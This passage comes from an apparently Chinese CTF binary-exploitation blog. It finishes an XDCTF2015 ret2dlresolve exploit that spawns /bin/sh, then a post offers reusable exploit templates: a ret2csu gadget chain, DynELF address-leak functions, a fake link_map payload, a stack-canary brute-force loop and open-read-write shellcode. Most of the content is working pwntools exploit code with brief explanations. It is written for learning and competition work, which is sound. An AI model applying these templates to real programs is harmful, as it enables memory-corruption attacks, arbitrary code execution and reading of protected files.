class="comment">#offset为负数，可以用‘(2 ** 64 - 1)’来控制范围 </span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0</span>) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) </span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) </span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) </span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, write_got ,l_addr)</span><br><span class="line">payload = flat( <span class="string">&#x27;a&#x27;</span> * <span class="number">120</span> ,pop_rdi, <span class="number">0</span> , pop_rsi , bss_stage , <span class="number">0</span> , read_plt , pop_rsi , <span class="number">0</span> ,<span class="number">0</span> , pop_rdi , bss_stage + <span class="number">0x48</span>  , plt_load , bss_stage , <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">read_plt触发时输入‘fake_link_map’，plt_load就是dl_runtime_resolve，控制程序手段执行dl_runtime_resolve，此时‘bss_stage’被当做第一个参数，‘0’被当做第二个参数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)  </span><br><span class="line">r.sendline(payload)  </span><br><span class="line"></span><br><span class="line">r.send(fake_link_map) <span class="comment">#把write重定位为system</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>可以来看一下fake_Linkmap_payload的栈帧:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| fake_linkmap_addr+<span class="number">0x00</span>  --&gt; offset <span class="comment">//DT_STRTAB（随便设置的）</span></span><br><span class="line"><span class="number">0008</span>| fake_linkmap_addr+<span class="number">0x08</span>  --&gt; <span class="number">0</span>	<span class="comment">//DT_JMPREL</span></span><br><span class="line"><span class="number">0010</span>| fake_linkmap_addr+<span class="number">0x10</span>  --&gt; fake_linkmap_addr + <span class="number">0x18</span> </span><br><span class="line"><span class="number">0018</span>| fake_linkmap_addr+<span class="number">0x18</span>  --&gt; fake_linkmap_addr + <span class="number">0x30</span> - offset </span><br><span class="line"><span class="number">0020</span>| fake_linkmap_addr+<span class="number">0x20</span>  --&gt; <span class="number">0x7</span></span><br><span class="line"><span class="number">0028</span>| fake_linkmap_addr+<span class="number">0x28</span>  --&gt; <span class="number">0</span> </span><br><span class="line"><span class="number">0030</span>| fake_linkmap_addr+<span class="number">0x30</span>  --&gt; <span class="number">0</span> </span><br><span class="line"><span class="number">0038</span>| fake_linkmap_addr+<span class="number">0x38</span>  --&gt; <span class="number">0</span> <span class="comment">//DT_SYMTAB</span></span><br><span class="line"><span class="number">0040</span>| fake_linkmap_addr+<span class="number">0x40</span>  --&gt; known_func_ptr - <span class="number">0x8</span> </span><br><span class="line"><span class="number">0048</span>| fake_linkmap_addr+<span class="number">0x48</span>  --&gt; b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span></span><br><span class="line">.................................... </span><br><span class="line"><span class="number">0068</span>| fake_linkmap_addr+<span class="number">0x68</span>  --&gt; fake_linkmap_addr </span><br><span class="line">    <span class="comment">//对应的值是DT_STRTAB的地址(fake_linkmap_addr)</span></span><br><span class="line"><span class="number">0070</span>| fake_linkmap_addr+<span class="number">0x70</span>  --&gt; fake_linkmap_addr + <span class="number">0x38</span> </span><br><span class="line">    <span class="comment">//对应的值是DT_SYMTAB的地址(fake_linkmap_addr + 0x38)</span></span><br><span class="line">.................................... </span><br><span class="line"><span class="number">00f</span>8| fake_linkmap_addr+<span class="number">0xf8</span>  --&gt; fake_linkmap_addr + <span class="number">0x8</span>   </span><br><span class="line">    <span class="comment">//对应的值是DT_JMPREL的地址(fake_linkmap_addr + 0x8)</span></span><br></pre></td></tr></table></figure>
<p><strong>dl_runtime_resolve</strong>被手动调用时，会读取“bss_stage”上的数据为“link_map”然后获取“JMPREL”，“SYMTAB”，“DT_STRTAB”，问题的关键就在于把它们三个的 <strong>“索引”</strong> 都弄成“0”，才能进行伪装</p>
<p>这种伪装方式不需要“JMPREL”，“SYMTAB”，“DT_STRTAB”的地址，只要一个已知函数的GOT表地址，和libc版本就可以了</p>
<hr>
<p><strong>注意：</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641234781843.png" alt="1641234781843"> </p>
<p>重定位入口的符号类型（一般为“0x7”）在“JMPREL”中看</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/" class="post-title-link" itemprop="url">各种模板</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-02 22:35:12" itemprop="dateCreated datePublished" datetime="2022-01-02T22:35:12+08:00">2022-01-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-03 17:30:20" itemprop="dateModified" datetime="2022-04-03T17:30:20+08:00">2022-04-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="各种模板"><a href="#各种模板" class="headerlink" title="各种模板"></a>各种模板</h2><p>pwn题中有许多目标模板，灵活利用可以节约大量时间</p>
<p>我打算把我遇到的所有模板都挂在这里，方便以后查找</p>
<hr>
<h2 id="CSU-万能pop模板"><a href="#CSU-万能pop模板" class="headerlink" title="CSU-万能pop模板"></a>CSU-万能pop模板</h2><p>当程序的常规gadgets不能满足需求时（通常是缺少“pop_rdx”），就需要万能pop</p>
<p>如果用<strong>csu</strong>进行寄存器赋值，需要两个重要的ROPgadgets：</p>
<p>csu_front_addr：</p>
<img src="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126255915-1642995722008-1647496563602.png" class width="1641126255915"> 
<p> csu_end_addr：</p>
<img src="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126386447-1642995722010-1647496563602.png" class width="1641126386447"> 
<p>这两个gadgets相互配合就可以执行任何已知函数</p>
<p>不同的程序csu可能不同（寄存器顺序不同），一定要确认并修改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr=</span><br><span class="line">csu_end_addr=</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call(只能是got表地址)</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    <span class="comment"># csu(0, 1, fun_got, rdx, rsi, rdi, last)</span></span><br><span class="line">    payload = padding + fake_ebp</span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    p.send(payload)</span><br></pre></td></tr></table></figure>
<p>​        // fun_got也可以是指向函数首地址的指针</p>
<p>例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, bss_addr, <span class="number">1</span>, main_addr)</span><br><span class="line"><span class="comment">#执行write(1,bss_addr,8)后，执行main_addr</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">8</span>, bss_addr, <span class="number">0</span>, main_addr)	</span><br><span class="line"><span class="comment">#执行read(0,bss_addr,8)后，执行main_addr</span></span><br></pre></td></tr></table></figure>
<p>​        //但是万能pop需要至少“136字节”（0x88）的溢出</p>
<h2 id="DynELF-基于puts的模板"><a href="#DynELF-基于puts的模板" class="headerlink" title="DynELF-基于puts的模板"></a>DynELF-基于puts的模板</h2><p>puts遇到“\x00”会中断，并且会在字符串结尾自动加上’\n’，非常不适合leak函数</p>
<p>所以想用puts来泄露地址，必须要对其进行处理：</p>
<p>64位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(addr) </span><br><span class="line">    payload += p64(puts_plt) + p64(ret_address)</span><br><span class="line">    p.send(payload) </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    count = <span class="number">0</span> </span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    up = <span class="string">&quot;&quot;</span> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>) </span><br><span class="line">        count += <span class="number">1</span> </span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>: </span><br><span class="line">            data = data[:-<span class="number">1</span>] </span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            data += c </span><br><span class="line">        up = c </span><br><span class="line">    data = data[:<span class="number">8</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(addr,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<p>32位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  payload = p32(puts_plt) + p32(ret_address) + p32(address)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) </span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">1</span>) </span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:  </span><br><span class="line">      buf = buf[:-<span class="number">1</span>]             </span><br><span class="line">      buf += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>]  </span><br><span class="line">  log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<p>数据接收那里很容易出问题，并且必须要有“ p.recvuntil(‘xxxx’) ”</p>
<p>因为程序在运行的过程中会输出一些字符串，可能会干扰数据接收的过程</p>
<h2 id="DynELF-基于write的模板"><a href="#DynELF-基于write的模板" class="headerlink" title="DynELF-基于write的模板"></a>DynELF-基于write的模板</h2><p>write比puts友好太多了，这个leak函数也比较简单：</p>
<p>64位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(pop_rsi_ret) + p64(addr)</span><br><span class="line">    payload += p64(pop_rdx_ret) + p64(<span class="number">8</span>)</span><br><span class="line">    payload += p64(write_plt) + p64(ret_address)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(addr,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = elf)</span><br><span class="line">function_libc = d.lookup(<span class="string">&#x27;function&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>32位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p32(write_plt) + p32(ret_address) </span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    data = p.recv(<span class="number">4</span>) </span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = elf)</span><br><span class="line">function_libc = d.lookup(<span class="string">&#x27;function&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>配合上面的万能pop，还可以形成更骚的操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, addr, <span class="number">1</span>, main_addr)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) </span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (addr, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))) </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="comment">#当然，配合puts也是可以的（puts和write就只有接收部分不同）</span></span><br></pre></td></tr></table></figure>
<p>注意：有些程序自带循环，可以根据具体情况进行修改</p>
<h2 id="ret2dlresolve-64位"><a href="#ret2dlresolve-64位" class="headerlink" title="ret2dlresolve-64位"></a>ret2dlresolve-64位</h2><p>如果题目中给出了libc版本，就可以用这个方法（泄露出libc版本后也行）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0</span>) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) </span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) </span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) </span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span> </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_linkmap_addr：可以控制的地址</span></span><br><span class="line"><span class="comment">#known_func_ptr：function_got（已知函数的GOT表地址）</span></span><br><span class="line"><span class="comment">#offset：system_got - function_got</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;function&#x27;</span>]  </span><br><span class="line">plt_load = addr(plt[<span class="number">1</span>]) <span class="comment"># dl_runtime_resolve</span></span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, function_got ,l_addr)</span><br><span class="line">payload = flat( padding, pop_rdi, <span class="number">0</span>, pop_rsi, bss_stage, <span class="number">0</span>, read_plt, pop_rsi, <span class="number">0</span>, <span class="number">0</span>, pop_rdi, bss_stage + <span class="number">0x48</span>, plt_load, bss_stage, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># “bss_stage+0x48”为&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)  </span><br><span class="line">p.sendline(payload)  </span><br><span class="line">p.send(fake_link_map) </span><br></pre></td></tr></table></figure>
<p>程序先利用read在“bss_stage”中写入了“fake_link_map”</p>
<p>在手动调用dl_runtime_resolve（plt_load），把“bss_stage”和“0”作为参数</p>
<p>执行完成之后，目标函数就会被重定位为“ system(“/bin/sh”) ”</p>
<p>理论上来讲，只要已知了libc版本就可以用这个来打</p>
<h2 id="canary爆破"><a href="#canary爆破" class="headerlink" title="canary爆破"></a>canary爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment">#32位为‘3’,64位为‘7’</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send( padding + canary + <span class="built_in">chr</span>(i)) <span class="comment">#从0~0xFF，依次注入</span></span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">in</span> a:	<span class="comment">#一次性不覆盖全部的canary，而是覆盖1字节</span></span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">canary=<span class="string">&#x27;\x00&#x27;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br></pre></td></tr></table></figure>
<p>这两个’xxxx’写什么是关键，要对比“canary通过”和“canary不通过”程序输出的字符串来填入</p>
<h2 id="ORW（ROP链-shellcode）"><a href="#ORW（ROP链-shellcode）" class="headerlink" title="ORW（ROP链+shellcode）"></a>ORW（ROP链+shellcode）</h2><p><strong>ORW原理：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;gmp.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">	void* bss;</span><br><span class="line">	<span class="built_in">int</span>* fd,mm;</span><br><span class="line">	fd=<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	mm=<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	bss=malloc(<span class="number">0x90</span>);</span><br><span class="line">	read(<span class="number">3</span>,bss,<span class="number">0x30</span>);</span><br><span class="line">	write(<span class="number">1</span>,bss,<span class="number">0x30</span>);</span><br><span class="line">	printf(<span class="string">&quot;fd &gt;&gt;%d\n&quot;</span>,fd);</span><br><span class="line">	printf(<span class="string">&quot;mm &gt;&gt;%d\n&quot;</span>,mm);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这里的“read(3,bss,0x30)”（如果前面已经调用了“open”，可以换成“read(4,bss,0x30)”）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ywhkkx&#125;</span><br><span class="line">fd &gt;&gt;<span class="number">3</span></span><br><span class="line">mm &gt;&gt;<span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><strong>Shellcode-32</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode=asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>
<p><strong>Shellcode-64</strong></p>
